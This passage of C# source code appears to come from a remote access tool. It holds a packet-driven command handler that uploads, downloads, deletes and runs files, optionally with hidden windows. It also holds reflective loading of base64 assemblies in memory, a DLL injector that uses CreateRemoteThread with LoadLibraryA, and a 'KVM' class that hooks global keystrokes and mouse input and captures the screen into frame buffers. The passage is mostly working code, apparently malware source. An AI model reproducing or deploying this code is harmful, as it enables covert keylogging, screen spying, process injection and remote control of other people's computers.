                        c.cngkey = CngKey.Import(c.bpublicKey, CngKeyBlobFormat.EccPublicBlob);
                        c.key = c.alice.DeriveKeyMaterial(CngKey.Import(c.bpublicKey, CngKeyBlobFormat.EccPublicBlob));
                        c.iv = null;
                        //c.publicKey = null;
                        c.bpublicKey = null;
                        //c.bob = null;
                        c.encryptedBytes = null;
                        c.plaintextBytes = null;
                        //c.alice = null;
                        return c;
                    }
                    catch (Exception) { return c; }

                }

                c.iv = null;
                //c.publicKey = null;
                c.bpublicKey = null;
                //c.bob = null;
                c.encryptedBytes = null;
                c.plaintextBytes = null;
                //c.alice = null;
                return c;
            }
            public CNG b(CNG c)
            {
                if (c.bob == null)
                {
                    c.bob = new ECDiffieHellmanCng();

                    c.bob.KeyDerivationFunction = ECDiffieHellmanKeyDerivationFunction.Hash;
                    c.bob.HashAlgorithm = CngAlgorithm.Sha256;
                    c.publicKey = c.bob.PublicKey.ToByteArray();
                    //c.cngkey = CngKey.Import(c.bpublicKey, CngKeyBlobFormat.EccPublicBlob);
                    c.key = c.bob.DeriveKeyMaterial(CngKey.Import(c.bpublicKey, CngKeyBlobFormat.EccPublicBlob));
                    c.iv = null;
                    c.bpublicKey = null;
                    //c.bob = null;
                    c.encryptedBytes = null;
                    c.plaintextBytes = null;
                    // c.alice = null;
                    return c;

                }
                if (c.bob != null)
                {

                    c.cngkey = CngKey.Import(c.bpublicKey, CngKeyBlobFormat.EccPublicBlob);
                    //c.bcngkey = c.cngkey;
                    c.key = c.bob.DeriveKeyMaterial(CngKey.Import(c.bpublicKey, CngKeyBlobFormat.EccPublicBlob));


                    c.encryptedBytes = null;
                    c.iv = null;
                    //c.publicKey = null;
                    c.bpublicKey = null;
                    //c.bob = null;
                    c.plaintextBytes = null;
                    //c.alice = null;
                    return c;

                }
                c.encryptedBytes = null;
                c.iv = null;
                //c.publicKey = null;
                c.bpublicKey = null;
                //c.bob = null;
                c.encryptedBytes = null;
                c.plaintextBytes = null;
                //c.alice = null;
                return c;
            }
        }
    }
    namespace Compression
    {
        using System;
        using System.Text;
        using System.IO;
        using System.IO.Compression;

        public class Compression
        {

            public byte[] getBytes { get; private set; }
            public Compression()
            { }
            public Compression(byte[] input)
            {
                getBytes = CompressBytesToBytes(input);
            }
            public Compression(byte[] bytes, long bufferSize)
            {
                getBytes = DeCompressBytesToBytes(bytes, bufferSize);
            }
            public byte[] CompressBytesToBytes(byte[] inBuffer)
            {
                using (MemoryStream resultStream = new MemoryStream())
                {
                    using (DeflateStream compressionStream = new DeflateStream(resultStream,
                             CompressionMode.Compress))
                    {
                        compressionStream.Write(inBuffer, 0, inBuffer.Length);
                    }
                    return resultStream.ToArray();
                }
            }
            public byte[] DeCompressBytesToBytes(byte[] bytes, long OriginalSize)
            {
                using (MemoryStream resultStream = new MemoryStream(bytes))
                {
                    using (DeflateStream compressionStream = new DeflateStream(resultStream,
                            CompressionMode.Decompress))
                    {
                        byte[] outBuffer = new byte[OriginalSize];   // need an estimate here
                        int length = compressionStream.Read(outBuffer, 0, outBuffer.Length);
                        return outBuffer;
                    }
                }
            }
        }
    }
    namespace Identify
    {
        using System;
        using System.Text;
        using System.Collections.Generic;
        using System.Linq;
        using System.Net.NetworkInformation;
        using System.Security.Cryptography;
        public class IDmaker
        {
            public String hash { get; private set; }
            public IDmaker()
            {
                try
                {
                    var macs = GetMACAddresses();
                    String prehash = "";
                    foreach (var mac in macs)
                    {
                        prehash += mac;
                    }
                    hash = getMD5Hash(prehash);
                }
                catch (Exception)
                {
                    hash = "0000000000000000000";
                    Console.WriteLine("\nError in IDmaker");
                }
            }
            public UInt64 getHash(String key)
            {
                char[] p = key.ToArray();
                UInt64 h = 2166136261;
                int i;

                for (i = 0; i < key.Length; i++)
                {
                    h = (h * 16777619) ^ p[i];
                }

                return h;
            }
            public string getMD5Hash(string input)
            {
                MD5 md5 = System.Security.Cryptography.MD5.Create();
                byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
                byte[] hash = md5.ComputeHash(inputBytes);
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < hash.Length; i++)
                {
                    sb.Append(hash[i].ToString("X2"));
                    //sb.Append(String.Format("{0:X2}", hash[i]));
                }
                return sb.ToString();
            }
            public IEnumerable<String> GetMACAddresses()
            {
                var macAddr =
                    (
                        from nic in NetworkInterface.GetAllNetworkInterfaces()
                        where nic.OperationalStatus == OperationalStatus.Up
                        select nic.GetPhysicalAddress().ToString()
                    );

                return macAddr.ToList();
            }
        }
    }
    namespace IO
    {
        public class FileOP
        {
            public byte[] Write(object obj)
            {
                var bytes = new byte[0];
                try
                {                   
                    
                        IFormatter formatter2 = new BinaryFormatter();
                        using (MemoryStream stream2 = new MemoryStream())
                        {
                            formatter2.Serialize(stream2, obj);
                            bytes = stream2.ToArray();
                        }
                   
                }
                catch { }

                return bytes;
            }

            public string _currentDirectory { get; set; }
            public Packet FOP(Packet packet)
            {
                if (packet.flag.ToUpper().Contains("<PUSH>") || packet.flag.ToUpper().Contains("<UPLOAD>")) //arg is name, data is base64 file string
                {
                    try { 
                        byte[] bytes = Convert.FromBase64String(packet.data);
                        var file = System.IO.File.Open(packet.arg, System.IO.FileMode.Create);
                        file.Write(bytes, 0, bytes.Length);
                        file.Close();
                        return Packet.Create("PUSH_SUCCESS", "<FOP>");
                    }
                    catch (Exception ee)
                    {
                        packet = Packet.Create(ee.ToString(), "<FAULT>");
                    }
                    return packet;
                }
                else if (packet.flag.ToUpper().Contains("<PULL>")|| packet.flag.ToUpper().Contains("<DOWNLOAD>")) //arg is name, data is base64 file string
                {
                    try
                    {
                        byte[] bytes = System.IO.File.ReadAllBytes(packet.data);
                        string str64 = Convert.ToBase64String(bytes);
                        return Packet.Create("GET_SUCCESS", "<FOP>");
                    }
                    catch (Exception ee)
                    {
                        packet = Packet.Create(ee.ToString(), "<FAULT>");
                    }
                    return packet;
                }
                else if (packet.flag.ToUpper().Contains("COPY")) //arg is name, data is base64 file string
                {
                    try
                    {
                        byte[] bytes = System.IO.File.ReadAllBytes(packet.data);
                        var file = System.IO.File.Open(packet.arg, System.IO.FileMode.Create);
                        file.Write(bytes, 0, bytes.Length);
                        file.Close();
                        return Packet.Create("COPY_SUCCESS", "<FOP>");
                    }
                    catch (Exception ee)
                    {
                        packet = Packet.Create(ee.ToString(), "<FAULT>");
                    }
                    return packet;
                }
                else if (packet.flag.ToUpper().Contains("<CUT>")) //arg is name, data is base64 file string
                {
                    try
                    {
                        byte[] bytes = System.IO.File.ReadAllBytes(packet.data);
                        var file = System.IO.File.Open(packet.arg, System.IO.FileMode.Create);
                        file.Write(bytes, 0, bytes.Length);
                        file.Close();
                        File.Delete(packet.data);
                        return Packet.Create("CUT_SUCCESS", "<FOP>");
                    }
                    catch (Exception ee)
                    {
                        packet = Packet.Create(ee.ToString(), "<FAULT>");
                    }
                    return packet;
                }
                else if (packet.flag.ToUpper().Contains("<DELETE>")) 
                {
                    try
                    {
                        File.Delete(packet.data);
                        return Packet.Create("DELETE_SUCCESS", "<FOP>");
                    }
                    catch (Exception ee)
                    {
                        packet = Packet.Create(ee.ToString(), "<FAULT>");
                    }
                    return packet;
                }
                else if (packet.flag.ToUpper().Contains("<DIR>")) //arg is name, data is base64 file string
                {
                    try
                    {
                       var dirs =  Directory.GetDirectories(packet.data);
                        packet = Packet.Create(Convert.ToBase64String(Write(dirs)),"<FOP><DIR>");
                    }
                    catch (Exception ee)
                    {
                        packet = Packet.Create(ee.ToString(), "<FAULT>");
                    }
                    return packet;
                }
                else if (packet.flag.ToUpper().Contains("<FILE>")) //arg is name, data is base64 file string
                {
                    try
                    {
                        var dirs = Directory.GetFiles(packet.data);
                        packet = Packet.Create(Convert.ToBase64String(Write(dirs)), "<FOP><FILES>");
                    }
                    catch (Exception ee)
                    {
                        packet = Packet.Create(ee.ToString(), "<FAULT>");
                    }
                    return packet;
                }
                else if (packet.flag.ToUpper().Contains("<DRIVE>")) //arg is name, data is base64 file string
                {
                    try
                    {
                        var dirs = Directory.GetLogicalDrives();
                        packet = Packet.Create(Convert.ToBase64String(Write(dirs)), "<FOP><DRIVES>");
                    }
                    catch (Exception ee)
                    {
                        packet = Packet.Create(ee.ToString(), "<FAULT>");
                    }
                    return packet;
                }
                else if (packet.flag.ToUpper().Contains("<EXECUTE>"))
                {
                    try
                    {
                        ProcessStartInfo startInfo = new ProcessStartInfo(packet.data);
                        if (packet.flag.ToUpper().Contains("<HIDE>"))
                        {
                            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            startInfo.CreateNoWindow = true;
                        }
                        
                        startInfo.ErrorDialog = false;
                        //startInfo.UseShellExecute = true;
                        
                        startInfo.Arguments = packet.arg;
                        Process.Start(startInfo);
                        packet = Packet.Create("EXECUTED", "<FOP>");
                    }
                    catch(Exception ee)
                    {
                        packet = Packet.Create(ee.ToString(), "<FAULT>");
                    }
                    return packet;
                }
                return Packet.Create("NOFOP","<FOP>");
            }
        }
    }
    namespace Reflection
    {
        [Serializable]
        public struct Mod
        {
            public byte[] Write(string path=null)
            {
                var bytes = new byte[0];
                try
                {
                    if (path != null)
                    {
                        IFormatter formatter = new BinaryFormatter();
                        Stream stream = new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.None);
                        formatter.Serialize(stream, this);
                        stream.Close();
                    }
                    try
                    {
                        IFormatter formatter2 = new BinaryFormatter();
                        using (MemoryStream stream2 = new MemoryStream())
                        {
                            formatter2.Serialize(stream2, this);
                            bytes = stream2.ToArray();                            
                        }
                    }
                    catch { }

                }
                catch { }

                return bytes;
            }
            public static Mod Read(string path)
            {
                Mod obj = new Mod();
                try
                {
                    IFormatter formatter = new BinaryFormatter();
                    Stream stream = new FileStream(path,
                                              FileMode.Open,
                                              FileAccess.Read,
                                              FileShare.Read);
                    obj = (Mod)formatter.Deserialize(stream);
                    stream.Close();
                }
                catch { }
                return obj;
            }

            public static Mod Create(String name, string asm64, bool load = true)
            {
                Mod m = new Mod();
                m.Name = name;
                m.Asm64 = asm64;
                m.Manifest = new ClassManifest();
                if (load == true)
                {
                    m.Assembly = Assembly.Load(Convert.FromBase64String(asm64));
                    //create asm manifest struct to enumerate all methods of all class types

                    m.Instance = null; m.Tag = null; m.Arguments = null; m.SelectedType = null; m.SelectedMethod = null; m.ReturnObject = null;

                }

                else
                {
                    m.Assembly = null;
                    m.Instance = null; m.Tag = null; m.Arguments = null; m.SelectedType = null; m.SelectedMethod = null; m.ReturnObject = null;
                }
                return m;
            }

            public Mod(String name, string asm64, bool load = true)
            {
                Name = name;
                Asm64 = asm64;
                Manifest = new ClassManifest();
                if (load == true)
                {
                    Assembly = Assembly.Load(Convert.FromBase64String(asm64));
                    //create asm manifest struct to enumerate all methods of all class types

                    Instance = null; Tag = null; Arguments = null; SelectedType = null; SelectedMethod = null; ReturnObject = null;

                }

                else
                {
                    Assembly = null;
                    Instance = null; Tag = null; Arguments = null; SelectedType = null; SelectedMethod = null; ReturnObject = null;
                }
            }
            public string Name;
            public object Tag;
            public Assembly Assembly;
            public string Asm64;
            public object Instance;
            public object[] Arguments;
            public Type SelectedType;
            public MethodInfo SelectedMethod;
            public ClassManifest Manifest;
            public Object ReturnObject;
        }
        [Serializable]
        public struct ClassManifest
        {
            public byte[] Write(string path)
            {
                var bytes = new byte[0];
                try
                {
                    IFormatter formatter = new BinaryFormatter();
                    Stream stream = new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.None);
                    formatter.Serialize(stream, this);
                    stream.Close();

                    try
                    {
                        IFormatter formatter2 = new BinaryFormatter();
                        using (MemoryStream stream2 = new MemoryStream())
                        {
                            formatter.Serialize(stream2, this);
                            bytes = stream2.ToArray();
                        }
                    }
                    catch { }

                }
                catch { }

                return bytes;
            }
            public static ClassManifest Read(string path)
            {
                ClassManifest obj = new ClassManifest();
                try
                {
                    IFormatter formatter = new BinaryFormatter();
                    Stream stream = new FileStream(path,
                                              FileMode.Open,
                                              FileAccess.Read,
                                              FileShare.Read);
                    obj = (ClassManifest)formatter.Deserialize(stream);
                    stream.Close();
                }
                catch { }
                return obj;
            }
            public string Name;
            public List<Type> Types;
            public List<List<MethodInfo>> MethodLists;
            public object Tag;
        }
        public class Worker
        {
            public Mod _Mod;
            public Worker() { _Mod = new Mod(); }
            public Worker(object source)
            {
                _Mod = Reflect(Load(source));
            }
            public Worker(object source, string type, string method, object[] arguments=null, bool assemble = false)
            {
                if (!assemble)
                {
                    _Mod = Select(Reflect(Load(source)), type, method,arguments);
                }
                if (assemble)
                {
                    _Mod = Assemble(Select(Reflect(Load(source)), type, method,arguments));
                }
            }
            public Mod Load(object source)
            {
                _Mod = new Mod();
                if (source is Assembly)
                {
                    _Mod.Assembly = (Assembly)source;
                }
                if (source is byte[])
                {
                    _Mod.Assembly = Assembly.Load((byte[])source);
                }
                if (source is string)
                {
                    try
                    {
                        string str = (string)source;
                        byte[] bytes = Convert.FromBase64String(str);
                        _Mod.Assembly = Assembly.Load(bytes);
                    }
                    catch
                    {
                        try
                        {
                            _Mod.Assembly = Assembly.LoadFile((string)source);
                        }
                        catch (Exception e) { _Mod.Tag = e; }
                    }
                }
                return _Mod;
            }
            public Mod Reflect(Mod module)
            {
                try
                {
                    module.Manifest = new ClassManifest();
                    module.Manifest.Types = module.Assembly.GetTypes().ToList();
                    module.Manifest.MethodLists = new List<List<MethodInfo>>();
                    foreach (var type in module.Manifest.Types)
                    {
                        module.Manifest.MethodLists.Add(type.GetMethods().ToList());
                    }
                    _Mod = module;
                    return module;
                }
                catch (Exception e)
                { module.Manifest.Tag = e; }
                return module;
            }
            public Mod Select(Mod module, string type = null, string method = null, object[] arguments = null)
            {
                try
                {
                    module.Arguments = arguments;
                    if (type != null)
                    {
                        foreach (var t in module.Manifest.Types)
                        {
                            if (t.Name.Equals(type))
                            {
                                module.SelectedType = t;
                            }
                        }
                    }
                    if (method != null)
                    {
                        foreach (var methodList in module.Manifest.MethodLists)
                        {
                            foreach (var m in methodList)
                            {
                                if (m.Name.Equals(method))
                                {
                                    module.SelectedMethod = m;
                                }
                            }
                        }
                    }

                    _Mod = module;
                }
                catch (Exception e) { module.Tag = e; }
                return module;
            }
            public Mod SelectIndex(Mod module, int type = 0, int method = 0, object[] arguments = null)
            {
                module.Arguments = arguments;
                module.SelectedType = module.Manifest.Types[type];
                module.SelectedMethod = module.Manifest.MethodLists[type][method];
                return module;
            }
            public Mod Assemble(Mod module)
            {
                try
                {
                    module.Instance = Activator.CreateInstance(module.SelectedType);
                    if (module.Arguments == null)
                    {
                        module.ReturnObject = module.SelectedMethod.Invoke(module.Instance, null);
                    }
                    else
                    {
                        module.ReturnObject = module.SelectedMethod.Invoke(module.Instance, module.Arguments);
                    }
                    _Mod = module;
                    return module;
                }
                catch (Exception e)
                { module.Tag = e; }
                return module;
            }
            public Mod ExecuteEntryPointFromMemory(Mod module, object[] arguments = null)
            {
                try
                {
                    MethodInfo Entry = module.Assembly.EntryPoint;
                    if (Entry != null)
                    {
                        object o = module.Assembly.CreateInstance(Entry.Name);
                        module.ReturnObject = Entry.Invoke(o, arguments);
                    }
                    return module;
                }
                catch (Exception e) { module.Tag = e; return module; }
            }



        }
    }
    namespace Injection
    {
        using System;
        using System.Diagnostics;
        using System.IO;
        using System.Runtime.InteropServices;
        using System.Text;
        public enum DllInjectionResult
        {
            DllNotFound,
            ProcessNotFound,
            InjectionFailed,
            Success
        }
        public sealed class Injector //was sealed
        {
            static readonly IntPtr INTPTR_ZERO = (IntPtr)0;

            [DllImport("kernel32.dll", SetLastError = true)]
            static extern IntPtr OpenProcess(uint dwDesiredAccess, int bInheritHandle, uint dwProcessId);

            [DllImport("kernel32.dll", SetLastError = true)]
            static extern int CloseHandle(IntPtr hObject);

            [DllImport("kernel32.dll", SetLastError = true)]
            static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

            [DllImport("kernel32.dll", SetLastError = true)]
            static extern IntPtr GetModuleHandle(string lpModuleName);

            [DllImport("kernel32.dll", SetLastError = true)]
            static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll", SetLastError = true)]
            static extern int WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, int lpNumberOfBytesWritten);

            [DllImport("kernel32.dll", SetLastError = true)]
            static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttribute, IntPtr dwStackSize, IntPtr lpStartAddress,
                IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            static Injector _instance;

            public static Injector GetInstance
            {
                get
                {
                    if (_instance == null)
                    {
                        _instance = new Injector();
                    }
                    return _instance;
                }
            }
            public Injector() { Exceptions = new List<Exception>(); }
            public List<Exception> Exceptions;
            public DllInjectionResult Inject(string sProcName, string sDllPath)
            {
                if (!File.Exists(sDllPath))
                {
                    Exceptions.Add(new Exception("DllNotFound"));
                    return DllInjectionResult.DllNotFound;
                }

                uint _procId = 0;

                Process[] _procs = Process.GetProcesses();
                for (int i = 0; i < _procs.Length; i++)
                {
                    if (_procs[i].ProcessName == sProcName)
                    {
                        _procId = (uint)_procs[i].Id;
                        break;
                    }
                }

                if (_procId == 0)
                {
                    Exceptions.Add(new Exception("ProcessNotFound"));
                    return DllInjectionResult.ProcessNotFound;
                }

                if (!bInject(_procId, sDllPath))
                {
                    Exceptions.Add(new Exception("InjectionFailed"));
                    return DllInjectionResult.InjectionFailed;
                }

                return DllInjectionResult.Success;
            }
            public DllInjectionResult Inject(uint pid, string sDllPath)
            {
                if (!File.Exists(sDllPath))
                {
                    return DllInjectionResult.DllNotFound;
                }

                uint _procId = pid;

                if (_procId == 0)
                {
                    return DllInjectionResult.ProcessNotFound;
                }

                if (!bInject(_procId, sDllPath))
                {
                    return DllInjectionResult.InjectionFailed;
                }

                return DllInjectionResult.Success;
            }
            bool bInject(uint pToBeInjected, string sDllPath)
            {
                IntPtr hndProc = OpenProcess((0x2 | 0x8 | 0x10 | 0x20 | 0x400), 1, pToBeInjected);

                if (hndProc == INTPTR_ZERO)
                {
                    Exceptions.Add(new Exception("Failed To Open Process Handle of Pid:" + pToBeInjected.ToString()));
                    return false;
                }

                IntPtr lpLLAddress = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

                if (lpLLAddress == INTPTR_ZERO)
                {
                    Exceptions.Add(new Exception("Failed GetProcAddress"));
                    return false;
                }

                IntPtr lpAddress = VirtualAllocEx(hndProc, (IntPtr)null, (IntPtr)sDllPath.Length, (0x1000 | 0x2000), 0X40);

                if (lpAddress == INTPTR_ZERO)
                {
                    Exceptions.Add(new Exception("Failed VirtualAllocEx"));
                    return false;
                }

                byte[] bytes = Encoding.ASCII.GetBytes(sDllPath);

                if (WriteProcessMemory(hndProc, lpAddress, bytes, (uint)bytes.Length, 0) == 0)
                {
                    Exceptions.Add(new Exception("Failed WriteProcessMemory"));
                    return false;
                }

                if (CreateRemoteThread(hndProc, (IntPtr)null, INTPTR_ZERO, lpLLAddress, lpAddress, 0, (IntPtr)null) == INTPTR_ZERO)
                {
                    Exceptions.Add(new Exception("Failed CreateRemoteThread"));
                    return false;
                }

                CloseHandle(hndProc);

                return true;
            }
            public bool InjectBytes(uint pToBeInjected, byte[] dllBytes)
            {
                IntPtr hndProc = OpenProcess((0x2 | 0x8 | 0x10 | 0x20 | 0x400), 1, pToBeInjected);

                if (hndProc == INTPTR_ZERO)
                {
                    Exceptions.Add(new Exception("Failed OpenProcess"));
                    return false;
                }

                IntPtr lpLLAddress = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

                if (lpLLAddress == INTPTR_ZERO)
                {
                    Exceptions.Add(new Exception("Failed GetProcAddress"));
                    return false;
                }

                IntPtr lpAddress = VirtualAllocEx(hndProc, (IntPtr)null, (IntPtr)dllBytes.Length, (0x1000 | 0x2000), 0X40);

                if (lpAddress == INTPTR_ZERO)
                {
                    Exceptions.Add(new Exception("Failed VirtualAllocEx"));
                    return false;
                }

                byte[] bytes = dllBytes;

                if (WriteProcessMemory(hndProc, lpAddress, bytes, (uint)bytes.Length, 0) == 0)
                {
                    Exceptions.Add(new Exception("Failed WiteProcessMemory"));
                    return false;
                }

                if (CreateRemoteThread(hndProc, (IntPtr)null, INTPTR_ZERO, lpLLAddress, lpAddress, 0, (IntPtr)null) == INTPTR_ZERO)
                {
                    Exceptions.Add(new Exception("Failed CreateRemoteThread"));
                    return false;
                }

                CloseHandle(hndProc);

                return true;
            }
        }
    }

    #endregion
}

namespace testbed
{

    public class KVM
    {
        #region Structures
        [Serializable]
        public struct Frame
        {
            public static Frame Create()
            {
                Frame f = new Frame();
                f.Time = DateTime.Now.ToString();
                return f;
            }
            public Image[] ImageFrame;
            public string KeyFrame;
            public MouseFrame MouseFrame;
            public string Time;
        }
        [Serializable]
        public struct MouseFrame
        {
            public static MouseFrame Create()
            {
                MouseFrame mf = new MouseFrame();
                mf.ClickPositions = new List<Mouse.MSLLHOOKSTRUCT>();
                return mf;
            }
            public Mouse.MSLLHOOKSTRUCT Start;
            public Mouse.MSLLHOOKSTRUCT End;
            public List<Mouse.MSLLHOOKSTRUCT> ClickPositions;
        }
        #endregion
        public byte[] ObjectToByteArray(object obj)
        {

            IFormatter formatter = new BinaryFormatter();
            byte[] bytes = null;
            try
            {
                using (MemoryStream stream = new MemoryStream())
                {
                    formatter.Serialize(stream, obj);
                    bytes = stream.ToArray();
                }
            }
            catch
            {

            }
            return bytes;
        }
        protected virtual void FrameReady(FrameEvent obj)
        {
            EventHandler<FrameEvent> handler = FrameCaptured;
            if (handler != null)
            {
                handler(this, obj);
            }
        }
        public class FrameEvent : EventArgs
        {
            public FrameEvent(Frame obj)
            {
                Data = obj;
            }
            public Frame Data { get; set; }
        }
        public event EventHandler<FrameEvent> FrameCaptured;
        protected virtual void FrameBufferReady(FrameBufferEvent obj)
        {
            EventHandler<FrameBufferEvent> handler = FrameBufferFull;
            if (handler != null)
            {
                handler(this, obj);
            }
        }
        public class FrameBufferEvent : EventArgs
        {
            public FrameBufferEvent(Frame[] obj = null)
            {
                if (obj != null)
                    Data = obj;
            }
            public Frame[] Data { get; set; }
        }
        public event EventHandler<FrameBufferEvent> FrameBufferFull;

        protected virtual void FireImageCaptured(Screen.ImageEvent obj)
        {
            EventHandler<Screen.ImageEvent> handler = ImageCaptured;
            if (handler != null)
            {
                handler(this, obj);
            }
        }
        public class ImageEvent : EventArgs
        {
            public ImageEvent(Image obj = null)
            {
                if (obj != null)
                {
                    Data = obj;
                }
            }
            public Image Data { get; set; }
        }
        public event EventHandler<Screen.ImageEvent> ImageCaptured;
        protected virtual void FireKeyPressEvent(KeyPressEvent obj)
        {
            EventHandler<KeyPressEvent> handler = KeyPressed;
            if (handler != null)
            {
                handler(this, obj);
            }
        }
        protected virtual void FireMousePressEvent(MouseEvent obj)
        {
            EventHandler<MouseEvent> handler = MousePressed;
            if (handler != null)
            {
                handler(this, obj);
            }
        }
        protected virtual void FireMouseMoveEvent(MouseEvent obj)
        {
            EventHandler<MouseEvent> handler = MouseMoved;
            if (handler != null)
            {
                handler(this, obj);
            }
        }
        public class ReturnEvent : EventArgs
        {
            public ReturnEvent(object obj = null)
            {
                if (obj != null)
                {
                    Data = obj;
                }
            }
            public object Data { get; set; }
        }
        public class MouseEvent : EventArgs
        {
            public MouseEvent(Mouse.MSLLHOOKSTRUCT obj)
            {
                try
                {
                    Data = obj;
                }
                catch { }
            }
            public Mouse.MSLLHOOKSTRUCT Data { get; set; }
        }
        public class KeyPressEvent : EventArgs
        {
            public KeyPressEvent(Keys obj)
            {
                try
                {
                    Data = obj;
                }
                catch { }
            }
            public Keys Data { get; set; }
        }
        public event EventHandler<KeyPressEvent> KeyPressed;
        public event EventHandler<MouseEvent> MousePressed;
        public event EventHandler<MouseEvent> MouseMoved;
        public static List<Image> Images = new List<Image>();
        public static MouseFrame MFrame = MouseFrame.Create();
        public static string KFrame = "";
        public static int FrameCount = 0;
        public static int MaxFrameCount = 16;
        private static int ResetBufferAfterXFrames = 4;
        public static int FrameBufferSize
        {
            get { return ResetBufferAfterXFrames; }
            set { ResetBufferAfterXFrames = value; }
        }
        public static bool NewFrame = true;
        public static bool LastFrame = false;
        public Key.LowLevelKeyboardProc _KeyDel;
        public Mouse.LowLevelMouseProc _MouseDel;
        public static List<Frame> Frames = new List<Frame>();
        public static readonly object _FrameLock = new object();
        public static readonly object _MouseLock = new object();
        public static readonly object _KeyLock = new object();
        public static readonly object _ImageLock = new object();

        public IntPtr _Key;
        public IntPtr _Mouse;
        public Screen _Video = new Screen();
        public KVM()
        {
            //Setup
            _KeyDel = KeyHookCallBack;
            _MouseDel = MouseHookCallBack;
            _Video.ImageCaptured += KVM_ImageCaptured; //bubble up

            //Default Event Methods
            //ImageCaptured += KVM_ImageCaptured;
            KeyPressed += Kvm_KeyPressed;
            MousePressed += Kvm_MousePressed;
            MouseMoved += Kvm_MouseMoved;



        }
        //Monitoring
        public static KVM StartMonitor(KVM kvm, int ImageFrequency = 1000, string logPath = null)
        {
            kvm._Key = Key.StartCustom(kvm._KeyDel, logPath);
            kvm._Mouse = Mouse.StartCustom(kvm._MouseDel, logPath);
            kvm._Video.StartScreenCapture(ImageFrequency);
            return kvm;
        }
        public static KVM StopMonitor(KVM kvm)
        {
            Key.StopCustom(kvm._Key);
            Mouse.StopCustom(kvm._Mouse);
            kvm._Video.StopScreenCapture();
            return kvm;
        }
        public static KVM StartController(string logPath = null)
        {
            KVM kvm = new KVM();
            return kvm;
        }
        public static KVM StartControlAndMonitor(string logPath = null)
        {
            KVM kvm = new KVM();
            return kvm;
        }

        //Control
        public void SendKey(Keys key)
        {
            Key.SendGlobalKey(key);
        }
        public void SetCursorPosition(int x, int y)
        {
            Mouse.SetPosition(x, y);
        }
        //Defaults
        private void KVM_ImageCaptured(object sender, Screen.ImageEvent e)
        {
            if (FrameCount == MaxFrameCount)
            {
                Frame frame = Frame.Create();
                //create a frame and add it to the master frame list buffer for sending
                lock (_MouseLock)
                {
                    frame.MouseFrame = MFrame;
                    NewFrame = true;
                    MFrame = MouseFrame.Create();
                }
                lock (_KeyLock)
                {
                    frame.KeyFrame = KFrame;
                    KFrame = "";
                }
                lock (_ImageLock)
                {
                    frame.ImageFrame = Images.ToArray();
                    Images = new List<Image>();
                }
                Frames.Add(frame);
                FrameReady(new FrameEvent(frame));
                if (Frames.Count >= ResetBufferAfterXFrames)
                {
                    FrameBufferReady(new FrameBufferEvent(Frames.ToArray()));
                    Frames = new List<Frame>();
                }
                FrameCount = 0;
            }
            lock (_ImageLock)
            {
                Images.Add(e.Data);
                ++FrameCount;
            }
        }
        private static void Kvm_MouseMoved(object sender, MouseEvent e)
        {
            lock (_MouseLock)
            {
                if (NewFrame)
                {
                    MFrame.Start = e.Data;
                    NewFrame = false;
                }
                else
                {
                    MFrame.End = e.Data;
                }
            }
        }
        private static void Kvm_MousePressed(object sender, MouseEvent e)
        {
            lock (_MouseLock)
            {
                MFrame.ClickPositions.Add(e.Data);
            }
        }
        private static void Kvm_KeyPressed(object sender, KeyPressEvent e)
        {
            lock (_KeyLock)
            {
                KFrame += e.Data;
            }
        }
        private IntPtr KeyHookCallBack(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)Key.WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                FireKeyPressEvent(new KeyPressEvent((Keys)vkCode));
            }
            return Key.CallNextHookEx(Key._hookID, nCode, wParam, lParam);
        }
        private IntPtr MouseHookCallBack(int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (nCode >= 0 && Mouse.MouseMessages.WM_LBUTTONDOWN == (Mouse.MouseMessages)wParam)
            {
                Mouse.MSLLHOOKSTRUCT hookStruct = (Mouse.MSLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(Mouse.MSLLHOOKSTRUCT));
                FireMousePressEvent(new MouseEvent(hookStruct));
            }
            if (nCode >= 0 && Mouse.MouseMessages.WM_MOUSEMOVE == (Mouse.MouseMessages)wParam)
            {
                Mouse.MSLLHOOKSTRUCT hookStruct = (Mouse.MSLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(Mouse.MSLLHOOKSTRUCT));
                FireMouseMoveEvent(new MouseEvent(hookStruct));
            }
            return Mouse.CallNextHookEx(Mouse._hookID, nCode, wParam, lParam);

        }

    }
    public class Key
    {
        #region DEFS
        public const int KEYEVENTF_EXTENDEDKEY = 0x0001; //Key down flag
        public const int KEYEVENTF_KEYUP = 0x0002;
        public const int VK_BACK = 0x08;

        public const int VK_TAB = 0x09;
        public const int VK_CLEAR = 0x0C;
        public const int VK_RETURN = 0x0D;
        public const int VK_SHIFT = 0x10;
        public const int VK_CONTROL = 0x11;// CTRL key
        public const int VK_MENU = 0x12;// ALT key
        public const int VK_PAUSE = 0x13;// PAUSE key
        public const int VK_CAPITAL = 0x14;// CAPS LOCK key
        public const int VK_KANA = 0x15;// Input Method Editor (IME) Kana mode
        public const int VK_HANGUL = 0x15;// IME Hangul mode
        public const int VK_JUNJA = 0x17;// IME Junja mode
        public const int VK_FINAL = 0x18;// IME final mode
        public const int VK_HANJA = 0x19;// IME Hanja mode 
        public const int VK_KANJI = 0x19;// IME Kanji mode
        public const int VK_ESCAPE = 0x1B;// ESC key
        public const int VK_CONVERT = 0x1C;// IME convert
        public const int VK_NONCONVERT = 0x1D;// IME nonconvert
        public const int VK_ACCEPT = 0x1E;// IME accept
        public const int VK_MODECHANGE = 0x1F;// IME mode change request
        public const int VK_SPACE = 0x20;// SPACE key
        public const int VK_PRIOR = 0x21;// PAGE UP key
